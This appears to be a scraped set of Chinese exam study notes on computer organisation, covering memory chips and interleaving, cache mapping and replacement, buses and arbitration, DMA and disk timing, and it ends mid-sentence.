可擦除可编程只读存储器允许用户写入信息, 可用某种方法擦除信息, 可多次重写 UVEPROM使用紫外线照射 8~20 分钟可擦除所有信息 EEPROM($E^2PROM$)使用电擦除特定的字 Flash Memory 闪速存储器(只读存储器)断电后也能保存信息, 可进行多次快速擦除重写需要先擦除在写入, 因此写速度要慢于读速度 如 U 盘, SD 卡等每个存储元使用单个 MOS 管, 位密度比 RAM 高 SSD 固态硬盘由 控制单元 + 存储单元(Flash 芯片) 构成, 可进行多次快速擦除重写速度快 功耗低, 价格高 主存一般由 RAM+ROM 组成,且二者统一编址 存储芯片与 CPU 的连接 注意片选线的符号是表示高电平有效还是低电平有效 位扩展 容量不变, 字长增加 CPU 相同的地址线连接多个芯片的地址线, 每个芯片的数据输出线连接到 CPU 不同的数据输入口 字扩展 容量增加, 字长不变 CPU 相同的地址线连接多个芯片的地址线, 每个芯片的数据输出线连接到 CPU 相同的数据输入口其余地址线连接芯片的片选线 线选法剩余的地址线分别连接芯片的片选线即高位地址线控制选择的芯片, 若用于选择芯片的地址线输出多个 1, 数据总线会产生冲突 译码片选法(常考)将多余地址线连接到译码器,译码器的输出连接到芯片的片选线, 即高地址为控制选择哪个芯片 译码器的使用, 选择的是哪些芯片地址空间属于哪块芯片 双端口 RAM用于优化多核 CPU, 多个 CPU 同时访问 RAM需要两组完全独立的数据线, 地址线和控制线 注意对于同一地址不能同时写,或同时写读 多模块存储器特点: 每个模块都有相同的容量和存取速度, 各模块拥有独立的读写控制电路, 地址寄存器和数据寄存器, 既能并行工作, 也能交叉工作 单体多字存储器 每次并行读出 m 个连续的字 总线宽度也为 m 个字 一次并行读出 m 个字, 不能单独读取其中某个字 指令和数据在主存必须是连续存放 多体并行存储器 设每个存储体的存取周期为 T, 存取时间为 r, 恢复时间为 3r, T=4r 高位交叉编制 用高比特位来表示要访问那个内存条,这些比特位被成为体号 理论上多个存储体可以被并行访问,但由于通常会连续访问, 因此实际上效果相当于单纯的扩容 在一个内存条内地址编号是连续的, 不满足程序的局部性原理 如果连续访问连续的地址(在同一个内存条内的地址),需要等待上一个存储体恢复周期结束才能读取下一个, 因此需要花费 nT 的时间(即一个 T 内只能读取一个存储体) 低位交叉编制 用低比特位来表示要访问那个内存条,这些比特位被成为体号 在同一内存条内地址编号不连续, 满足程序的局部性原理01H 地址对应第一根内存条的第一个存储体,而 02H 对应第二根内存条的第一个存储体, 以此类推 如果连续访问连续的地址(在同一个内存条内的地址), 就不需要等待上一个存储体的恢复, 可以直接读取下一个存储体, 因此至需花费 T+(n-1)r(注意,这个算式是以 4 根内存条来计算 即在一个 T 内,可以读取地址连续的存储体为 4 个, 读取完第四个存储体后,刚好第一个内存条完成恢复时间,可以读取下一个,因此在一个周期内可以读取 4 个数据,读取完最后一个存储体后,在等待恢复时间 3r,即读取完成) 当存储模块数 $m \\geq \\frac{T}{r}$ 时, 可以使流水线不间断 每个存储周期内可读写地址连续的 m 个字 微观上, m 个模块被串行访问 宏观上, 每个存储周期内所有模块被并行访问 要会计算读取多少个字需要多长的时间注意: 时间包括等待模块写回的时间在题目中,r 可以被表示为存取时间或总线传输周期 CacheCache 使用 SRAM 实现 工作原理 局部性原理 空间局部性: 最近的未来要使用的信息(指令和数据)与现在使用的信息在存储空间上是邻近的 时间局部性: 最近的未来使用的信息是现在正在使用的信息(一条指令执行后, 在不久的将来可能会被使用) 将 CPU 目前访问的地址周围部分的数据放到 Cache 中 性能指标(常考)$t_c为访问一次Cache所需的时间$$t_m为访问一次主存所需的时间$ 命中率 HCPU 欲访问的信息已在 Cache 中的比率 缺失率(未命中)M = 1 - H 平均访问时间 先访问 Cache,若 Cache 未命中在访问主存$t=Ht_c+(1-H)(t_c+t_m)$ 同时访问 Cahce 和主存,若 Cache 命中则立即停止访问主存$t=Ht_c+(1-H)t_m$ Cache 主存系统的效率$e=\\frac{访问Cache的时间}{平均访问时间}$ 每次访问的主存块立即调入 Cache 中 Cache 与主存的映射方式 在 Cache 块中,通过标记记录存放的主存块号,通过有效位来表示标记是否有效 Cache 块的大小与主存块的大小相等 若主存大小为$256M=2^{28}, 块大小(行长)=64B=2^{6}$ 则主存的地址共 28 位 主存块号 块内地址 22 位 6 位 全相联映射(随意放)主存块可以放在 Cache 的任意位置 缺点查找标记慢 优点能充分利用 Cache 存储空间 CPU 访问方式 CPU 要访问的主存地址的块号与 Cache 中的标记进行对比 若标记匹配,且有效位=1, 则 Cache 命中 若未命中或有效位=0, 则正常访问主存 地址格式为|标记|块内地址| 标记是主存块号块内地址的位数为: Cache 一个块的大小所需的位数 直接映射每个主存块只能放到一个特定的位置Cahce 块号=主存块号 % Cahce 总数 缺点不能充分利用 Cache, 命中率低 优点可以优化标记位,省略块号末尾的$log_2Cache块数$位, 速度最快 CPU 访问方式 取出块号的后$log_2Cache块数$位, 直接访问 Cache 中对应的块 若主存块号的其余位(除去$log_2Cache块数$位)与 Cache 标记位相同,且有效位为 1,则 Cache 命中 若未命中或有效位=0, 则正常访问主存 地址格式为|标记|Cache 行号|块内地址| 标记是主存块号Cache 行号为: 分成 n 行所需的位数块内地址的位数为: Cache 一个块的大小所需的位数 组相联映射Cahce 块分为若干组, 每个主存块可放到特定分组的任意一个位置 2 路组相联映射: 2 个 Cache 块为一组n 路组相联映射: n 个 Cache 块为一组 组号=主存块号 % 分组数 另外两种方法的折中, 综合效果比较好 CPU 访问方式 取出块号的后$log_2\\frac{Cache块数}{每个分组块数}$位, 找出对应的 Cache 组 在对应的 Cahce 分组中, 主存块号的其余位(除去$log_2\\frac{Cache块数}{每个分组块数}$位)与标志位对比,若相同且有效位=1,则 Cache 命中 若未命中或有效位=0, 则正常访问主存 地址格式为|标记|组号|块内地址| 标记是主存块号组号为: 分成 n 组所需的位数块内地址的位数为: Cache 一个块的大小所需的位数 Cache 替换算法 全相联映射Cache 完全满了才需要替换 直接映射如果对应位置非空, 则直接替换 组相联映射只有分组内满了才需要在分组内选择替换 随机算法(RAND)若 Cache 已满,则随机选择一块替换 优点实现简单 缺点没考虑局部性原理, 命中率低, 实际效果很不稳定 先进先出算法(FIFO)若 Cache 已满, 替换最先被调入 Cache 的块 优点实现简单 缺点没考虑局部性原理, 命中率低, 最先进入 Cache 的可能是最频繁访问的 抖动现象刚被替换的块很快又被访问 近期最少使用(LRU)(最常考)每一个 Cache 设置一个计数器(用来记录该 Cache 块有多长时间没被访问), 每次替换选择计数器最大的块(淘汰最久没访问的块) 计数器规则 命中时, 所命中的 Cache 的计数器清零, 比该计数器值更小的计数器值加 1 未命中且还有空闲时, 新装入的 Cache 块的计数器置 0, 其余非空闲计算机加 1 未命中且无空闲时, 计数器最大的 Cache 块被替换,计数器置 0,其余加 1 优点实际运行效果优秀, Cache 命中率高 缺点若被频繁访问的主存块数量&gt;Cache 行的数量, 则有可能发生抖动 近期不经常使用(LFU)每一个 Cache 设置一个计数器(用来记录每个块被访问过多少次), 每次替换计数器最小的块(淘汰最少使用的块) 计数器规则 新调入的块计数器=0 块被访问一次,对应的计数器+1 替换时, 替换计数器最小的块, 计数器置 0 若有多个计数器最小的块可以按行号递增(淘汰行号小的)或 FIFO 策略(淘汰先进入 Cache 的)淘汰 缺点曾经经常被访问的主存块,未来不一定会用到,因此有可能会在 Cache 中停留很长时间因为要存储命中次数,因此计数器的可能需要较大的存储空间Cache 可能不高 Cache 写策略 因为只有写操作才会导致 Cache 中的数据与主存中的数据不一致 当 CPU 的写操作在 Cache 中时,称为写命中; 不在 Cache 中,则称为写不命中写命中对应的算法有写回法和全写法 写回法当 CPU 对 Cache 写命中时, 只修改 Cache 的内容, 当此块被换出时, 才写回主存 脏位表示 Cache 中的数据是否被修改, 若修改则在该块被替换时写回主存 优点减少了访存的次数 缺点存在数据不一致的隐患 全写法当 CPU 对 Cache 写命中时, 必须把数据同时写入 Cache 和主存中(一般使用写缓冲, 写缓冲通过 SRAM 实现) 优缺点使用写缓冲, CPU 写的速度很快若写操作不频繁, 则效果好若写操作频繁,则可能会因为写缓冲饱和而发生阻塞 写分配法当 CPU 对 Cache 写不命中时, 把主存中的块调入 Cache, 在 Cache 中修改.(通常搭配写回法) 非写分配法当 CPU 写不命中时,只写入主存,不调入 Cache(常搭配全写法使用)在使用这种方法时, 只有读未命中才调入 Cache 中 各级 Cache 之间常使用全写法+非写分配法Cache 与主存之间常使用写回法+写分配法 页式存储器 页式存储系统: 一个进程在逻辑上被分为若干个大小相等的页面,每个页面大小与块的大小相同. 每个页面可以离散的放入不同的主存块中 每个页面与主存块的大小相同 逻辑地址(虚地址): 程序员看到的地址由逻辑页号与页内地址组成, 页表一般存储在主存中 物理地址(是地址): 时间在主存的地址由主存块号和块内地址组成 页表中存储逻辑页号对应的主存块号 在使用逻辑地址时 计算机会将逻辑地址拆分成逻辑页号和页内地址 将逻辑页号取出, 然后在 CPU 中取出页表基地址 然后在页表中找到对应的主存块号; 主存块号拼接上页内地址后成为物理地址 块表 相当于地址变化过程中添加了一个 Cache, 加快页号转换为主存块号的时间区别是快表存储的是页表项中的副本, 而 Cache 存储的是主存块的副本 在逻辑地址变化的基础上, 插入一个快表,先在快表中查找有无对应的主存块号快表使用 SRAM, 是相联存储器, 可以按内容寻访 补充 DMA 方式能使 I/O 设备直接和存储器进行成批数据的快速传送","link":"/COP-COP-3/"},{"title":"计算机组成原理——总线","text":"计算机组成原理——总线 目录 总线的基本概念 总线的分类 按数据传输的方式 按总线功能（连接的部件） 按时序控制方式 系统总线的结构 单总线结构 双总线结构 三总线结构 总线的性能指标 总线的传输周期（总线周期） 总线时钟周期（重要） 总线的工作频率 总线的时钟频率（重要） 总线宽度 总线带宽 总线复用 信号线数 总线仲裁 总线仲裁的分类 集中仲裁方式 链式查询方式 计时器定时查询方式 独立请求方式 分布仲裁方式 总线的操作和定时 总线传输的四个阶段 总线定时 总线定时的方法 同步通信（同步定时方式） 异步通信（异步定时方式） 异步定时方式的分类 半同步通信 分离式通信 总线标准 总线根据计算机系统中的位置分类 并行总线 串行总线 总线的基本概念 一个数据总线内包含多跟信号线(几个比特几根信号线)同一时刻只有一个部件发送数据, 多个部件接收数据 总线的定义总线是一组能为多个部件分时共享的公共信息传送路径 特点 共享和分时共享: 总线上可以挂接多个部件, 各个部件之间互相交换的信息都可以通过这组线分时共享分时: 同一时刻只允许有一个部件向总线发送数据, 可以有多个部件同时接收数据 易于随时增减外部设备 总线的特性 机械特性尺寸, 形状, 管教数, 排列顺序 电气特性传输方向有效的电平范围 功能特性每根传输线的功能(地址, 数据, 控制) 时间特性信号的时序关系 总线的分类 按数据传输的方式 串行总线发送数据时逐个比特发送 优点只需要一根传输线, 成本低, 广泛用于长距离传输抗干扰能力强用于计算机内部时, 节省布线空间 缺点在数据发送和接收的时候, 需要进行拆卸和装配要考虑串行,并行的转换问题 并行总线一次可以发送多个比特 优点总线的逻辑时序比较简单, 电路实现容易 缺点信号线数量多, 占用更多的布线空间. 远距离传输成本高工作频率较高时, 并行的信号线之间会产生严重干扰, 对每条线等长的要求也越高, 因此无法持续提升工作频率 比较 工作频率相同时串行总线传输速度比并行总线慢 并行总线的工作频率无法持续提高, 串行总线可以不断提高工作频率来提高传输速率, 最后超过并行总线 按总线功能(连接的部件) 片内总线芯片内部的总线CPU 芯片内寄存器与寄存器之间, 寄存器与 ALU 之间的公共连线 系统总线计算机系统内部各功能部件(CPU, 主存, I/O 设备)之间互相连接的总线 数据总线(DB)传输各功能部件之间的数据信息,包括指令和操作数位数与机器字长,存储字长有关可以双向传输 地址总线(AB)指出数据总线上的元数据或目的数据虽在的包括主存单元或 I/O 端口的地址位数与主存地址空间大小及设备数量有关只能单向传输 控制总线(CB)一根控制总线传输一个信号(单向)CPU 送出的控制命令(输出)外设返回 CPU 的反馈信号(输入) 通信总线(外部总线)用于计算机系统之间的连接(远程通信设备,测试设备)之间信息传送的总线 如网线等 按时序控制方式 同步总线 异步总线 系统总线的结构 桥接器: 用于连接不同的总线, 具有数据缓冲, 转换和控制功能越靠近 CPU 的总线速度越快 单总线结构CPU, 主存, I/O 设备都连接在一组总线上允许 I/O 设备之间, I/O 设备和 CPU 之间或 I/O 设备与主存之间的直接交换信息 优点结构简单, 成本低, 易于接入新的设备 缺点带宽低负载重多个部件争用唯一的总线不支持并发传送操作 一组包括数据总线, 地址总线和控制总线 双总线结构有两条总线一条是主存总线, 用于 CPU,主存和通道之间进行数据传送另一条是I/O 总线, 用于多个外部设备与通道之间进行数据传送 优点将叫低速的 I/O 设备从单总线上分离出来, 实现存储器总线和 I/O 总线分离 缺点需要增加通道等硬件设备 通道是具有特殊功能的处理器, 能对 I/O 设备进行统一管理通道程序放在主存中主存总线支持突发(猝发)传送: 送出一个地址, 收到多个地址连续的数据(主设备给出一个首地址, 设备从首地址开始的若干连续单元读出或写入多个数据) 三总线结构在计算机各系统部件之间采用 3 条各自独立的总线(主存总线, I/O 总线, 直接内存访问(DMA)总线)来构成信息通路 优点提高了 I/O 设备的性能, 使其更快地响应命令. 提高系统吞吐量 缺点系统工作效率低(同一时刻只有一根总线工作) 总线的性能指标 总线的传输周期(总线周期)一次总线操作所需的时间, 通常由若干各总线时钟周期构成(也可以包含多个总线时钟周期) 包括申请阶段, 寻址阶段, 传输阶段和结构阶段经过一个总线周期可以完成一组数据的传送 总线时钟周期(重要)一般就是机器的时钟周期 计算机中用一个统一的时钟, 来控制整个计算机的部件,总线也受此时钟的控制 总线的工作频率指一秒内传送几次数据(总线上各种操作的频率)$总线的工作频率=总线周期的倒数$$总线的工作频率=总线时钟频率\\times 每个时钟周期传输次数 $$总线周期=N 个时钟周期$, 则$总线的工作频率=\\frac{时钟频率}{N}$ 总线的时钟频率(重要)指一秒内由多少个时钟周期$时钟频率=\\frac{1}{时钟周期}$ 总线宽度总线位宽,表示总线上同时能传说的数据位数通常也是数据总线的根数 总线带宽总线的数据传输率(单位时间内总线上可传送数据的位数) $$总线带宽=总线工作频率\\times 总线宽度(bit/s)\\\\总线带宽=frac{总线宽度}(总线周期)(B/s)$$ $总线的工作频率=\\frac{1}{总线周期}$ 计算有效数据传输率时, 需要去掉冗余数据(校验位等) 总线复用指一种信号线在不同时间传输不同的信息可以使用较少的线传输更多的信息, 节省空间和成本 信号线数地址总线,数据总线和控制总线的信号线数总和 总线仲裁 将总线上连接的各类设备按其是否由总线控制能力分为: 主设备 获得总线控制权的设备 从设备 被主设备访问的设备, 只能响应从主设备发来的各种总线命令 总线仲裁的定义多个主设备同时竞争主线控制权时, 以某种方式选中一个主设备优先获得总线控制权称为总线仲裁 总线仲裁的分类 集中仲裁方式由一个设备来决定哪个部件优先获得总线控制权集中仲裁又分为 工作流程 主设备发出请求信号 若多个主设备同时要使用总线, 则又总线控制器的判优,仲裁逻辑按一定的优先等级顺序缺点哪个主设备能使用总线 获得总线使用权的主设备开始传送数据 链式查询方式 总线忙的信号由获得总线控制权的设备发出设备得到总线控制权后, 不会继续发送 BG 信号 优先级离总线控制器越近的部件, 优先级更高 优点优先级固定只需要很少几根控制线就能按一定优先次序实现总线控制结构简单, 扩充容易 缺点对硬件电路的故障敏感优先级不能改变, 当优先级高的部件频繁请求使用总线时, 优先级低的部件将长期不能使用总线 计时器定时查询方式 结构特点用一个计数器控制总线使用权相对链式查询方式多了一组设备地址线, 少了一根总线响应线 BG仍公用一根总线请求线 工作流程 总线控制器收到总线请求信号, 判断总线空闲时, 计数器开始计数计数值通过设备地址线发向各个部件(顺序逐个发送) 当设备地址线的计数值与请求使用总线设备的地址一致时该设备获得总线控制权,并向 BS 发送总线忙信号同时中止计数器的计数和查询 当获得总线控制权的设备停止发送总线忙的信号后若仍有设备在请求总线控制权(向 BR 发送信号), 则计数器继续步骤 1 优点计数初始值可以改变优先次序计数每次从设定的值开始, 设备的优先级就按顺序排列, 固定不变计数从上次的终点开始(不是上一个部件地址开始, 而是上一个部件的下一个部件地址), 此时设备使用总线的优先级相等计数器的初值可以由程序设置对电路的故障没有链式敏感 缺点增加了控制线数, 若有 n 各设备, 则需$\\lceil log_2n \\rceil + 2$ 条控制线控制相对比链式查询更复杂 独立请求方式 结构特点每一个设备均有一对总线请求线 BR 和总线允许线 BG排队器: 当接收到多个总线请求信号时, 优先将总线控制权分配给哪一个设备 工作流程 设备需要使用总线时, 经各自的总线请求线发送总线请求信号, 在总线控制器中排队 当总线控制器按一定的优先次序决定哪个部件获得总线控制权 优点响应速度快, 总线允许信号 BG 直接从控制器发送到有关设备, 无需在设备间传递或查询对优先次序的控制相当灵活 缺点控制线数量多, 若有 n 个设备, 则需要$2n+1$条控制线, 其中+1的为 BS 线, 同于设备向总线控制器反馈是否在使用总线总线的控制逻辑更加复杂 分布仲裁方式各部件自行商量由哪个部件优先获得总线控制权 特点不需要中央仲裁器, 每个潜在额度主模块都有自己的仲裁器和仲裁号, 多个仲裁器竞争使用总线 工作方式 当设备有总线请求时, 把各自唯一的仲裁号发送到共享的仲裁总线上 每个仲裁器将从仲裁总线上得到的仲裁号与自己的仲裁号进行比较如果仲裁总线上的号优先级高, 则该部件的总线请求不予响应, 并撤销它的仲裁号 最后, 优先级高的仲裁号保留在仲裁总线上 总线的操作和定时 总线传输的四个阶段 申请分配阶段由需要使用总线的主模块提出申请经总线仲裁机构决定将下一传输周期的总线使用权授予某一申请者 也可以将此阶段分为传输请求和总线仲裁两个阶段 寻址阶段获得使用权的主模块通过总线发出本次要访问的从模块的地址及有关命令启动参与本次传输的从模块 传输阶段主模块和从模块进行数据交换可单向或双向进行数据传送 结束阶段主模块的有关信息均从系统总线上撤除让出总线使用权 总线定时 定义指总线在双方交换数据的过程中需要时间上配合关系的控制 实际上是一种协议或规则 总线定时的方法 同步通信(同步定时方式) 同步通信适用于总线长度较短及总线所接部件的存取时间比较接近的系统 由统一时钟控制数据传送 若干个时钟产生相等的时间间隔每个间隔构成一个总线周期 在一个总线周期内发送方和接收方可进行一次数据传送 每个部件或设备发送(接收)信息都在固定的总线传输周期中一个总线的传送周期结束, 下一个总线传送周期开始 优点传送速度快具有较高的传送速率总线控制逻辑简单 缺点主从设备属于强制性同步不能及时进行数据通信的有效性检验可靠性较差 异步通信(异步定时方式) 根据请求和回答信号的撤销是否互锁分类 在异步定时方式中,没有统一的时钟,也没有固定的时间间隔依靠传送双方相互制约的握手信号来实现定时控制主设备提出交换信息的请求信号, 经接口传送到从设备; 从设备接到主设备的请求后, 通过接口向主设备发出回答信号 优点总线周期长度可变,能保证两个工作速度相差很大的部件或设备之间可靠地进行信息交换,自动适应时间的配合 缺点比同步控制方式稍复杂一些,速度比同步定时方式慢 异步定时方式的分类 不互锁方式主设备发出请求信号后, 不必等到接到从设备的回答信号,而是经过一段时间, 便撤销请求信号而从设备在接到请求信号后,发出回答信号,并经过一段时间,自动撤销回答信号双方不存在互锁关系 半互锁方式主设备发出请求信号后,必须待接到从设备的回答信号后,才撤销请求信号,有互锁的关系而从设备在接到请求信号后,发出回答信号,但不必等待获知主设备的请求信号已经撤销,而是隔一段时间后自动撤销回答信号,不存在互锁关系 全互锁方式 主设备发出请求信号后,必须待从设备回答后,才撤销请求信号;从设备发出回答信号,必须待获知主设备请求信号已撤销后,再撤销其回答信号双方存在互锁关系 半同步通信同步和异步的结合 分离式通信 在总线周期内通信的方式为其中 1, 3 使用总线, 而 2 没有使用总线 主模块发地址, 命令 从模块准备数据 从模块向主模块发数据 该方法在 2 阶段放弃总线使用权, 提高总线的利用率 将总线传输周期分为两个独立的子周期第一个子周期中, 主模块申请占用总线,使用完后放弃总线的使用权第二个子周期中, 从模块申请占用总线,将各种信息送至总线上 特点 各模块均有权申请占用总线 采用同步方式通信,不等对方回答 各模块准备数据时,不占用总线 总线利用率提高 总线标准 总线根据计算机系统中的位置分类 系统总线通常与 CPU 直接相连,用于连接 CPU 与北桥芯片或 cPU 与主存等 局部总线没有直接与 CPU 连接,通常是连接高速的北桥芯片,用于连接了很多重要的硬件部件(如显卡,声卡等) 设备总线,通信总线通常由南桥芯片控制,用于连接计算机与计算机,或连接计算机与外部 I/O 设备 总线标准 特性 考试频率 ISA 系统总线(并行) 易考 EISA 系统总线(并行) 易考 VESA 局部总线(并行) 并行传输 受 CPU 控制 PCI 局部总线(并行) 不受 CPU 控制 支持突发传送 支持即插即用 易考 AGP 局部总线 显卡专用的局部总线 PCI-E 点对点串行传输数据 传输速度快 支持热拔插 可允许全双工方式 易考 RS-232C 串行通信总线 SCSI 智能通用接口(并行) PCMCIA 便携设备接口(并行) 即插即用 USB 设备总线(串行) 热插拔 即插即用 具有很强的连接能力和扩充性(最多连接 127 个外设) 每次只能传输 1bit 数据 易考 IDE(ATA) 硬盘光驱接口(并行) SATA 串行硬盘接口 并行总线用 m 根线每次传送 m 个比特用高/低电平表示 1/O,通常采用同步定时方式由于线间信号干扰,因此总线工作频率不能太高另外,各条线不能有长度差,长距离并行传输时工艺难度大 串行总线用两根线每次传送一个比特,采用差模信号表示 1/O通常采用异步定时方式,总线工作频率可以很高现在的串行总线通常基于包传输,如 80bit 为一个数据包,包与包之间有先后关系,因此可以用多个数据通路分别串行传输多个数据包因此某种程度上现在的串行总线也有并行的特点","link":"/COP-COP-6/"},{"title":"计算机组成原理——输入输出系统","text":"计算机组成原理——输入输出系统 目录 输入输出系统的基本概念 I/O 控制方式 程序查询方式 程序中断方式 DMA 控制方式 若使用 DMA 总线 通道控制技术 I/O 系统基本组成 外部设备 显示器 阴极射线管（CRT）显示器 打印机 外存储器 磁盘存储器（重点） 磁盘设备的组成 磁盘的性能指标 磁盘地址 磁盘的工作过程 磁盘阵列 光盘存储器 I/O 接口 I/O 接口的作用 I/O 接口的工作原理 I/O 端口及编址 端口 编址 I/O 接口的类型 中断 中断的基本概念 中断请求标记 中断判优 优先级设置 中断处理过程 中断隐指令 中断服务程序 多重中断 中断屏蔽技术 输入输出系统的基本概念 I/O 接口又称 I/O 控制器(I/O Controller),设备控制器, 负责协调主机与外部设备之间的数据传输 I/O 控制方式 程序查询方式CPU 不断轮询检查 I/O 控制器中的状态寄存器, 检测到状态为已完成之后, 再从数据寄存器取出输入数据 CPU 一旦启动 I/O, 必须停止现行程序的运行, 并在现行程序中插入一段程序 主要特点CPU 有踏步等待现象, CPU 与 I/O 串行工作 优点接口设计简单,设备量少 缺点CPU 在信息传送过程中要花费很多时间用于查询和等待而且如果采用独占查询, 则在一段时间内只能和一台外设交换信息, 效率大大降低 独占查询CPU 100%的时间都在查询 I/O 状态完全串行 定时查询在保证数据不丢失的情况下, 每隔一段时间 CPU 查询一次 I/O 状态查询的间隔内 CPU 可执行其他程序 程序中断方式等待键盘 I/O 时 CPU 可以先去执行其他程序, 键盘 I/O 完成后 I/O 控制器向 CPU 发出中断请求, CPU 响应中断请求, 并取走输入数据 DMA 控制方式 主要考 DMA 的传送过程和传送方式 主存与高速 I/O 设备之间有一条直接数据通路(DMA 总线)CPU 向 DMA 接口发出读/写命令, 并指明主存地址,磁盘地址,读写数据量等参数DMA 控制器自动控制磁盘与主存的数据读写, 每完成一整块数据读写(如 1KB 为一整块), 才向 CPU 发出一次中断请求 工作流程CPU 向 DMA 控制器指明要输入还是输出;要传送多少个数据;数据在主存,外设中的地址 接受外设发出的 DMA 请求(外设传送一个字的请求), 并向 CPu 发出总线请求 CPU 响应此总线请求, 发出总线响应信号, 接管总线控制权, 进入 DMA 操作周期 确定传送数据的主存单元地址及长度, 并能自动修改主存地址计数和传送长度计数 规定数据在主存和外设间的传送方向, 发出读写等控制信号, 执行数据传送操作 向 CPU 报告 DMA 操作的结果 其中 1,2 在传送前完成 若使用 DMA 总线主存和 DMA 接口之间有一条直接数括通路由于 DMA 方式传送数据不需要经过 cPu, 因此不必中断现行程序, I/O 与主机并行工作, 程序和传送并行工作 该 DMA 方式具有的特点 它使主存与 CPU 的固定联系脱钩, 主存既可被 CPU 访问, 又可被外设访问 在数据块传送时, 主存地址的确定,传送数据的计数等都由硬件电路直接实现 主存中要开辟专用缓冲区, 及时供给和接收外设的数据 DMA 传送速度快, CPU 和外设并行工作, 提高了系统效率 DMA 在传送开始前要通过程序进行预处理, 结束后要通过中断方式进行后处理 DMA 传送方式 停止 CPU 访问主存控制简单CPU 处于不工作状态或保持状态未充分发挥 CPU 对主存的利用率 2. DMA与CPU交替访存 不需要总线使用权的申请,建立和归还过 程硬件逻辑更为复杂 周期挪用(周期窃取)DMA 访问主存有三种可能:CPU 此时不访存(不冲突)CPU 正在访存(存取周期结束让出总线)CPU 与 DMA 同时请求访存(I/O 访存优先) DMA 方式与中断方式的对比 中断 DMA 数据传送 程序控制程序的切换 → 保存和恢复现场 硬件控制CPU 只需进行预处理和后处理 中断请求 传送数据 后处理 响应 指令执行周期结束后响应中断 每个机器周期结束均可, 总线空闲时即可响应 DMA 请求 场景 CPU 控制, 低速设备 DMA 控制器控制, 高速设备 优先级 优先级低于 DMA 优先级高于中断 异常处理 能处理异常事件 仅传送数据 通道控制技术可以理解为是弱鸡版的 CPU通道可以识别并执行一系列通道指令, 通道指令种类能通常比较单一 I/O 系统基本组成 I/O 硬件包括外部设备,I/O 接口,I/O 总线等 I/O 软件包括驱动程序,用户程序,管理程序,升级补丁等通常采用 IO 指令和通道指令实现主机和 I/O 设备的信息交换 注: I/O 指令与普通指令格式略有不同,操作码指明了 CPU 要对 I/O 接口做什么, 命令码指明了 I/O 接口要对设备做什么 外部设备 显示器 重点是 VRAM 的计算 屏幕大小以对角线长度表示, 常用的有 12 ～ 29 英寸等 分辨率所能表示的像素个数, 屏幕上的每一个光点就是一个像素, 以宽,高的像素的乘积表示, 例如, 800×600 1024×768 和 1280×1024 等 灰度级灰度级是指黑白显示器中所显示的像素点的亮暗差别, 在彩色显示器中则表现为颜色的不同, 灰度级越多, 图像层次越清楚逼真, 典型的有 8 位(256 级),16 位等n 位可以表示 2 种不同的亮度或颜色 刷新光点只能保持极短的时间便会消失, 为此必须在光点消失之前再重新扫描显示一遍, 这个过程称为刷新刷新频率:单位时间内扫描整个屏幕内容的次数按照人的视觉生理, 刷新频率大于 30Hz 时才不会感到闪烁, 通常显示器刷新频率在 60 ～ 120Hz 显示存储器(VRAM)也称刷新存储器, 为了不断提高刷 新图像的信号, 必须把一帧图像信息存储在刷新存储器中其存储容量由图像分辨率和灰度级决定, 分辨率越高, 灰度级越多, 刷新存储器容量越大$$VRAM容量=分辨率 \\times 灰度级位数$$$$VRAM带宽=分辨率 \\times 灰度级位数 \\times 帧频$$ 阴极射线管(CRT)显示器 字符显示器显示字符的方法以点阵为基础点阵是指由$m\\times n$个点组成的阵列点阵的多少取决于显示字符的质量和字符窗口的大小字符窗口是指每个字符在屏幕上所占的点数, 它包括字符显示点阵和字符间隔将点阵存入由 ROM 构成的字符发生器中, 在 CRT 进行光栅扫描的过程中, 从字符发生器中依次读出某个字符的点阵, 按照点阵中 0 和 1 代码不同控制扫描电子束的开或关, 从而在屏幕上显示出字符对应于每个字符窗口, 所需显示字符的 ASCII 代码被存放在视频存储器 VRAM 中, 以备刷新 打印机 击打式打印机利用机械动作使印字机构与色带和纸相撞而打印字符 优点设备成本低印字质量好 缺点噪声大速度慢 如:机打发票银行回执单(防伪性好) 非击打式打印机采用电,磁,光,喷墨等物理,化学方法来印刷字符 优点速度快噪声小 缺点成本高 外存储器 重点是磁盘存取时间的计算 所谓磁表面存储,是指把某些磁性材料薄薄地涂在金属铝或塑料表面上作为载磁体来存储信息磁盘存储器,磁带存储器和磁鼓存储器均属于磁表面存储器 磁表面存储器的优点: 存储容量大, 位价格低; 记录介质可以重复使用; 记录信息可以长期保存而不丢失, 甚至可以脱机存档; 非破坏性读出, 读出时不需要再生 磁表面存储器的缺点: 存取速度慢; 机械结构复杂; 对工作环境要求较高 磁盘存储器(重点) 磁盘设备的组成 存储区域一块硬盘含有若干个记录面每个记录面划分为若干条磁道每条磁道又划分为若干个扇区扇区(也称块)是磁盘读写的最小单位, 也就是说磁盘按块存取 名称 作用 磁头数 即记录面数, 表示硬盘总共有多少个磁头, 磁头用于读取/写入盘片上记录面的信息, 一个记录面对应一个磁头 柱面数 表示硬盘每一面盘片上有多少条磁道在一个盘组中, 不同记录面的相同编号(位置)的诸磁道构成一个圆柱面 扇区数 表示每一条磁道上有多少个扇区 硬盘存储器硬盘存储器由磁盘驱动器,磁盘控制器和盘片组成 磁盘驱动器核心部件是磁头组件和盘片组件, 温彻斯特盘是一种可移动头固定盘片的硬盘存储器 磁盘控制器是硬盘存储器和主机的接口, 主流的标准有 IDE,SCSI,SATA 等 磁盘的性能指标 磁盘的容量 一个磁盘所能存储的字节总数称为磁盘容量磁盘容量有非格式化容量和格式化容量之分 非格式化容量指磁记录表面可以利用的磁化单元总数 格式化容量指按照某种特定的记录格式所能存储信息的总量 记录密度 记录密度是指盘片单位面积上记录的二进制的信息量, 通常以道密度,位密度和面密度表示 道密度是沿磁盘半径方向单位长度上的磁道数; 位密度是磁道单位长度上能记录的二进制代码位数; 面密度是位密度和道密度的乘积 注意:磁盘所有磁道记录的信息量一定是相等的,并不是圆越大信息越多, 故每个磁道的位密度都不同 平均存取时间 $$平均存取时间=寻道时间+旋转延迟时间+传输时间$$ 寻道时间磁头移动到目的磁道 旋转延迟时间磁头定位到所在扇区 若题目为给出, 则以磁头旋转半圈的时间来计算 传输时间传输数据所花费的时间 数据传输率 磁盘存储器在单位时间内向主机传送数据的字节数 称为数据传输率 假设磁盘转数为$r(转/秒)$, 每条磁道容量为$N$个字节, 则数据传输率为$D_r=rN$ 磁盘地址 驱动器号 柱面(磁道)号 盘面号 扇区号 一台电脑可能由有多个硬盘 移动磁头臂(寻道) 激活某个磁头 通过旋转将特定扇区划过磁头下方 磁盘的工作过程硬盘的主要操作是寻址,读盘,写盘每个操作都对应一个控制字, 硬盘工作时, 第一步是取控制字, 